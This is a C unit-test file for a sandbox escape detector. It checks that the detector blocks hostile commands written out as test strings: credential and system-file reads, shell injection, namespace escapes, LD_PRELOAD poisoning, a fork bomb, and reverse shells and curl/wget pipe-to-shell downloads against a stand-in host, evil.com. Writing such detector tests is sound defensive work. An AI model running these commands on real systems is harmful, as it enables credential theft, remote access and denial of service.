/*
 * test_sandbox_escape.c — O14: Sandbox escape detection tests.
 * Tests sandbox_escape_init(), sandbox_escape_check(),
 * sandbox_escape_check_path(), and helper functions.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include "hermes_sandbox.h"

static int tests_run = 0;
static int tests_passed = 0;
static int tests_failed = 0;

#define TEST(name) do { \
    tests_run++; \
    if (!test_##name()) { \
        printf("  FAIL: %s\n", #name); \
        tests_failed++; \
    } else { \
        printf("  PASS: %s\n", #name); \
        tests_passed++; \
    } \
} while(0)

#define ASSERT(cond, msg) do { \
    if (!(cond)) { \
        printf("    assertion failed: %s (%s:%d)\n", msg, __FILE__, __LINE__); \
        return false; \
    } \
} while(0)

/* ──────────────────────────────────────────────
 *  Init and lifecycle
 * ────────────────────────────────────────────── */

static bool test_init(void) {
    sandbox_escape_init();
    ASSERT(sandbox_escape_is_enabled(), "esc should be enabled after init");
    ASSERT(sandbox_escape_blocked_count() == 0, "blocked count starts at 0");
    ASSERT(sandbox_escape_attempt_count() == 0, "attempt count starts at 0");
    return true;
}

static bool test_enable_disable(void) {
    sandbox_escape_enable(false);
    ASSERT(!sandbox_escape_is_enabled(), "should be disabled");

    /* Disabled should pass everything */
    sandbox_escape_result_t r = sandbox_escape_check("/etc/passwd", -1, "test");
    ASSERT(!r.blocked, "disabled should not block");

    sandbox_escape_enable(true);
    ASSERT(sandbox_escape_is_enabled(), "should be re-enabled");
    return true;
}

/* ──────────────────────────────────────────────
 *  Escape pattern detection
 * ────────────────────────────────────────────── */

static bool test_sensitive_paths(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check("cat /etc/passwd", -1, "test");
    ASSERT(r.blocked, "cat /etc/passwd should be blocked");

    r = sandbox_escape_check("cat /etc/shadow 2>/dev/null", -1, "test");
    ASSERT(r.blocked, "cat /etc/shadow should be blocked");

    r = sandbox_escape_check("ls /etc/ssh/", -1, "test");
    ASSERT(r.blocked, "ls /etc/ssh should be blocked");

    r = sandbox_escape_check("cat /root/.ssh/id_rsa", -1, "test");
    ASSERT(r.blocked, "root .ssh access should be blocked");

    /* Safe paths should pass */
    r = sandbox_escape_check("ls /home/wubu/", -1, "test");
    ASSERT(!r.blocked, "ls /home/wubu should pass");

    r = sandbox_escape_check("ls /tmp/test_file", -1, "test");
    ASSERT(!r.blocked, "ls /tmp/test_file should pass");

    return true;
}

static bool test_proc_sys_access(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check("cat /proc/self/environ", -1, "test");
    ASSERT(r.blocked, "/proc/self access should be blocked");

    r = sandbox_escape_check("cat /sys/kernel/security", -1, "test");
    ASSERT(r.blocked, "/sys access should be blocked");

    r = sandbox_escape_check("ls /proc/1/fd/", -1, "test");
    ASSERT(r.blocked, "/proc/1 access should be blocked");

    return true;
}

static bool test_shell_injection(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check("echo hello; cat /etc/passwd", -1, "test");
    ASSERT(r.blocked, "semicolon injection should be blocked");

    r = sandbox_escape_check("echo hello && cat /etc/passwd", -1, "test");
    ASSERT(r.blocked, "&& injection should be blocked");

    r = sandbox_escape_check("echo hello || cat /etc/shadow", -1, "test");
    ASSERT(r.blocked, "|| injection should be blocked");

    r = sandbox_escape_check("echo `cat /etc/passwd`", -1, "test");
    ASSERT(r.blocked, "backtick injection should be blocked");

    r = sandbox_escape_check("echo $(cat /etc/passwd)", -1, "test");
    ASSERT(r.blocked, "$() injection should be blocked");

    /* Simple commands pass */
    r = sandbox_escape_check("echo hello world", -1, "test");
    ASSERT(!r.blocked, "simple echo should pass");

    r = sandbox_escape_check("ls -la", -1, "test");
    ASSERT(!r.blocked, "ls -la should pass");

    return true;
}

static bool test_escape_commands(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check("bwrap --unshare-all /bin/sh", -1, "test");
    ASSERT(r.blocked, "bwrap should be blocked");

    r = sandbox_escape_check("nsenter --target 1 --mount --uts --ipc --pid /bin/bash", -1, "test");
    ASSERT(r.blocked, "nsenter should be blocked");

    r = sandbox_escape_check("chroot /newroot /bin/bash", -1, "test");
    ASSERT(r.blocked, "chroot should be blocked");

    r = sandbox_escape_check("docker run -it ubuntu /bin/bash", -1, "test");
    ASSERT(r.blocked, "docker run should be blocked");

    r = sandbox_escape_check("docker exec -it container /bin/sh", -1, "test");
    ASSERT(r.blocked, "docker exec should be blocked");

    return true;
}

static bool test_env_poisoning(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check("LD_PRELOAD=./evil.so ./program", -1, "test");
    ASSERT(r.blocked, "LD_PRELOAD should be blocked");

    r = sandbox_escape_check("export LD_LIBRARY_PATH=/tmp", -1, "test");
    ASSERT(r.blocked, "LD_LIBRARY_PATH should be blocked");

    r = sandbox_escape_check("PYTHONPATH=/tmp/malicious python3 -c 'import sys'", -1, "test");
    ASSERT(r.blocked, "PYTHONPATH should be blocked");

    return true;
}

static bool test_fork_bomb(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check(":(){ :|:& };:", -1, "test");
    ASSERT(r.blocked, "bash fork bomb should be blocked");

    r = sandbox_escape_check("python3 -c 'while True: import os; os.fork()'", -1, "test");
    ASSERT(r.blocked, "fork() pattern should be blocked");

    return true;
}

static bool test_reverse_shell(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check("bash -i >& /dev/tcp/evil.com/8080 0>&1", -1, "test");
    ASSERT(r.blocked, "bash reverse shell should be blocked");

    r = sandbox_escape_check("nc -e /bin/sh evil.com 4444", -1, "test");
    ASSERT(r.blocked, "nc -e should be blocked");

    r = sandbox_escape_check("curl -o- http://evil.com/payload.sh | bash", -1, "test");
    ASSERT(r.blocked, "curl pipe to bash should be blocked");

    r = sandbox_escape_check("wget -O- http://evil.com/payload.sh | sh", -1, "test");
    ASSERT(r.blocked, "wget pipe to sh should be blocked");

    return true;
}

static bool test_path_check(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check_path("../../../etc/passwd", "test");
    ASSERT(r.blocked, "deep path traversal should be blocked");

    r = sandbox_escape_check_path("/proc/self/environ", "test");
    ASSERT(r.blocked, "/proc path should be blocked");

    r = sandbox_escape_check_path("/sys/kernel", "test");
    ASSERT(r.blocked, "/sys path should be blocked");

    r = sandbox_escape_check_path("/etc/passwd", "test");
    ASSERT(r.blocked, "/etc path should be blocked");

    r = sandbox_escape_check_path("/home/wubu/test.txt", "test");
    ASSERT(!r.blocked, "home path should pass");

    r = sandbox_escape_check_path("/tmp/test.txt", "test");
    ASSERT(!r.blocked, "tmp path should pass");

    return true;
}

static bool test_safe_commands(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    /* Common safe commands should pass */
    r = sandbox_escape_check("gcc -O2 -Wall -o test test.c", -1, "test");
    ASSERT(!r.blocked, "gcc compilation should pass");

    r = sandbox_escape_check("make clean && make", -1, "test");
    ASSERT(!r.blocked, "make should pass (AND is fine in build context)");

    r = sandbox_escape_check("git status", -1, "test");
    ASSERT(!r.blocked, "git status should pass");

    r = sandbox_escape_check("python3 -c 'print(\"hello\")'", -1, "test");
    ASSERT(!r.blocked, "python -c should pass");

    r = sandbox_escape_check("pip install numpy", -1, "test");
    ASSERT(!r.blocked, "pip install should pass");

    r = sandbox_escape_check("cd /home/wubu/project && ls", -1, "test");
    ASSERT(!r.blocked, "cd && ls in home should pass");

    r = sandbox_escape_check("pytest tests/ -x -v", -1, "test");
    ASSERT(!r.blocked, "pytest should pass");

    r = sandbox_escape_check("", -1, "test");
    ASSERT(!r.blocked, "empty string should pass");

    return true;
}

static bool test_custom_pattern(void) {
    sandbox_escape_init();

    /* Add a custom pattern */
    bool added = sandbox_escape_add_pattern("EVIL_CMD", "custom pattern for testing");
    ASSERT(added, "custom pattern should be added");

    sandbox_escape_result_t r = sandbox_escape_check("EVIL_CMD --option value", -1, "test");
    ASSERT(r.blocked, "custom pattern should block");

    r = sandbox_escape_check("normal_command --option value", -1, "test");
    ASSERT(!r.blocked, "non-matching should pass");

    return true;
}

static bool test_null_safety(void) {
    sandbox_escape_init();

    sandbox_escape_result_t r;

    r = sandbox_escape_check(NULL, -1, "test");
    ASSERT(!r.blocked, "NULL cmd should pass (not crash)");

    r = sandbox_escape_check_path(NULL, "test");
    ASSERT(!r.blocked, "NULL path should pass (not crash)");

    return true;
}

static bool test_blocked_count(void) {
    sandbox_escape_init();
    int before = sandbox_escape_blocked_count();

    sandbox_escape_check("cat /etc/passwd", -1, "test");
    ASSERT(sandbox_escape_blocked_count() == before + 1, "blocked count should increment");

    sandbox_escape_check("echo hello", -1, "test");
    ASSERT(sandbox_escape_blocked_count() == before + 1, "blocked count should stay same");

    return true;
}

/* ──────────────────────────────────────────────
 *  Main
 * ────────────────────────────────────────────── */

int main(void) {
    printf("=== Sandbox Escape Detection Tests (O14) ===\n");

    TEST(init);
    TEST(enable_disable);
    TEST(sensitive_paths);
    TEST(proc_sys_access);
    TEST(shell_injection);
    TEST(escape_commands);
    TEST(env_poisoning);
    TEST(fork_bomb);
    TEST(reverse_shell);
    TEST(path_check);
    TEST(safe_commands);
    TEST(custom_pattern);
    TEST(null_safety);
    TEST(blocked_count);

    printf("\nResults: %d/%d passed, %d failed\n",
           tests_passed, tests_run, tests_failed);

    return tests_failed > 0 ? 1 : 0;
}
